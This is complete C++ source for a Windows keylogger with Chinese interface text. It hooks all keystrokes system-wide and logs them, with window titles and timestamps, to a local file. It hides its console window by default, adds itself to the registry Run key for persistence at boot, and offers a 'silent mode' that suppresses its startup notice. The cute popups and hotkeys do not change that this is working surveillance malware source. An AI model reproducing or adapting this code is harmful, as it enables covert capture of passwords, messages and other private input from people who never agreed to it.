#define UNICODE
#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
#include <shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define invisible // (visible / invisible)

// Defines whether you want to enable or disable 
// boot time waiting if running at system boot.
#define bootwait // (bootwait / nowait)

// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0

// defines if ignore mouseclicks
#define mouseignore

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

bool isRecording = true;
HHOOK _hook;

#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]" },
    {VK_RETURN,	"\n" },
    {VK_SPACE,	"_" },
    {VK_TAB,	"[TAB]" },
    {VK_SHIFT,	"[SHIFT]" },
    {VK_LSHIFT,	"[LSHIFT]" },
    {VK_RSHIFT,	"[RSHIFT]" },
    {VK_CONTROL,	"[CONTROL]" },
    {VK_LCONTROL,	"[LCONTROL]" },
    {VK_RCONTROL,	"[RCONTROL]" },
    {VK_MENU,	"[ALT]" },
    {VK_LWIN,	"[LWIN]" },
    {VK_RWIN,	"[RWIN]" },
    {VK_ESCAPE,	"[ESCAPE]" },
    {VK_END,	"[END]" },
    {VK_HOME,	"[HOME]" },
    {VK_LEFT,	"[LEFT]" },
    {VK_RIGHT,	"[RIGHT]" },
    {VK_UP,		"[UP]" },
    {VK_DOWN,	"[DOWN]" },
    {VK_PRIOR,	"[PG_UP]" },
    {VK_NEXT,	"[PG_DOWN]" },
    {VK_OEM_PERIOD,	"." },
    {VK_DECIMAL,	"." },
    {VK_OEM_PLUS,	"+" },
    {VK_OEM_MINUS,	"-" },
    {VK_ADD,		"+" },
    {VK_SUBTRACT,	"-" },
    {VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif

KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}



int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";
#ifndef mouseignore 
    if ((key_stroke == 1) || (key_stroke == 2))
    {
        return 0; // ignore mouse clicks
    }
#endif
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        // get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            // get time
            struct tm tm_info;
            time_t t = time(NULL);
            localtime_s(&tm_info, &t);
            char s[64];
            strftime(s, sizeof(s), "%FT%X%z", &tm_info);

            output << "\n\n[Window: " << window_title << " - at " << s << "] " << "\n";
        }
    }

#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end())
    {
        output << keyname.at(key_stroke);
    }
    else
    {
        char key;
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        // map virtual key according to keyboard layout
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // tolower converts it to lowercase properly
        if (!lowercase)
        {
            key = tolower(key);
        }
        output << char(key);
    }
#endif
    // instead of opening and closing file handlers every time, keep file open and flush.
    output_file << output.str();
    output_file.flush();

    std::cout << output.str();

    return 0;
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
    FreeConsole();
#endif
}

// Function to check if the system is still booting up
bool IsSystemBooting()
{
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

// 自启注册表项名称
const wchar_t* REG_RUN_PATH = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const wchar_t* APP_NAME = L"MyKeylogger";

// 获取当前程序完整路径
std::wstring GetModulePath()
{
    wchar_t path[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

// 判断是否已设置自启
bool IsAutoStartEnabled()
{
    HKEY hKey;
    bool enabled = false;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        wchar_t value[MAX_PATH];
        DWORD size = sizeof(value);
        if (RegQueryValueExW(hKey, APP_NAME, NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS)
        {
            enabled = (GetModulePath() == value);
        }
        RegCloseKey(hKey);
    }
    return enabled;
}

// 设置或取消自启
bool SetAutoStart(bool enable)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;

    bool result = false;
    if (enable)
    {
        std::wstring path = GetModulePath();
        result = (RegSetValueExW(hKey, APP_NAME, 0, REG_SZ, (BYTE*)path.c_str(), (DWORD)((path.size() + 1) * sizeof(wchar_t))) == ERROR_SUCCESS);
    }
    else
    {
        result = (RegDeleteValueW(hKey, APP_NAME) == ERROR_SUCCESS);
    }
    RegCloseKey(hKey);
    return result;
}

// 静默启动注册表项
const wchar_t* SILENT_MODE_VALUE = L"SilentMode";

// 获取静默启动状态
bool IsSilentMode()
{
    HKEY hKey;
    DWORD value = 0, size = sizeof(value);
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        if (RegQueryValueExW(hKey, SILENT_MODE_VALUE, NULL, NULL, (LPBYTE)&value, &size) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            return value == 1;
        }
        RegCloseKey(hKey);
    }
    return false;
}

// 设置静默启动状态
bool SetSilentMode(bool enable)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;
    DWORD value = enable ? 1 : 0;
    bool result = (RegSetValueExW(hKey, SILENT_MODE_VALUE, 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return result;
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN)
        {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            // Check for Ctrl + Shift + Alt + P
            if (kbdStruct.vkCode == 'P' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                isRecording = !isRecording;
                if (isRecording)
                {
                    std::cout << "录制继续\n";
                    MessageBox(NULL, L"继续录(/≧▽≦)/", L"录制继续", MB_OK);
                }
                else
                {
                    std::cout << "录制暂停\n";
                    MessageBox(NULL, L"不录啦╰(￣ω￣ｏ)", L"录制暂停", MB_OK);
                }
            }
            // Check for Ctrl + Shift + Alt + Q
            else if (kbdStruct.vkCode == 'Q' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                MessageBox(NULL, L"真不录啦（*゜ー゜*）\n\n那拜拜啦(o゜▽゜)o☆", L"录制结束", MB_OK);
                std::cout << "录制结束\n";
                ReleaseHook();
                output_file.close();
                exit(0);
            }
            // Check for Ctrl + Shift + Alt + S (开机自启)
            else if (kbdStruct.vkCode == 'S' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                bool enabled = IsAutoStartEnabled();
                if (SetAutoStart(!enabled))
                {
                    if (!enabled)
                        MessageBox(NULL, L"已设置为开机自启 awa", L"自启设置", MB_OK);
                    else
                        MessageBox(NULL, L"已取消开机自启 qaq", L"自启设置", MB_OK);
                }
                else
                {
                    MessageBox(NULL, L"自启设置失败，请以管理员身份运行w", L"自启设置", MB_OK | MB_ICONERROR);
                }
            }
            // Check for Ctrl + Shift + Alt + D (静默启动)
            else if (kbdStruct.vkCode == 'D' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                bool silent = IsSilentMode();
                if (SetSilentMode(!silent))
                {
                    if (!silent)
                        MessageBox(NULL, L"已设置为静默启动（下次启动不再弹窗）", L"静默启动", MB_OK);
                    else
                        MessageBox(NULL, L"已取消静默启动（下次启动会弹窗）", L"静默启动", MB_OK);
                }
                else
                {
                    MessageBox(NULL, L"设置静默启动失败，请以管理员身份运行", L"静默启动", MB_OK | MB_ICONERROR);
                }
            }
            else
            {
                // save to file only if recording
                if (isRecording)
                {
                    Save(kbdStruct.vkCode);
                }
            }
        }
    }

    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}


int main()
{
    Stealth();
    if (!IsSilentMode()) {
        MessageBox(NULL, L"开录 q(≧▽≦q)\n\n快捷键小提示ww\nCtrl + Shift + Alt + P  暂停录制\nCtrl + Shift + Alt + Q  结束录制\nCtrl + Shift + Alt + S  设置/取消静默启动\n\n录制日志将保存在当前目录的keylogger.log文件中  ヾ(≧▽≦*)o", L"录制开始", MB_OK);
    }
#ifdef bootwait 
    while (IsSystemBooting())
    {
        std::cout << "系统正在启动中。10秒后再次检查...\n";
        Sleep(10000);
    }
#endif
#ifdef nowait 
    std::cout << "跳过系统启动检查。\n";
#endif
    const char* output_filename = "keylogger.log";
    std::cout << "输出日志到 " << output_filename << std::endl; std::cout << "输出日志到 " << output_filename << std::endl;

    output_file.open(output_filename, std::ios_base::app);

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }

    ReleaseHook();
    output_file.close();
    return 0;
}
